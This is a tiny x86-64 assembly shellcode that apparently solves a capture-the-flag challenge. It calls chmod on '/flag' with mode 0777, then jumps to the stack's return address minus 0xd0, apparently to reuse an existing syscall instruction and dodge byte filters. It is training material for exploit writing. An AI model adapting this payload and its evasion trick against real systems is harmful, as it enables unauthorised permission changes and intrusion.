.global _start
_start:
.intel_syntax noprefix
	mov eax, 0x5a
        lea rdi, [rip+flag]
        mov rsi, 0x1ff
	lea rdx, [rsp]
	sub qword ptr [rdx], 0xd0
	jmp [rdx]
flag:
	.string "/flag"
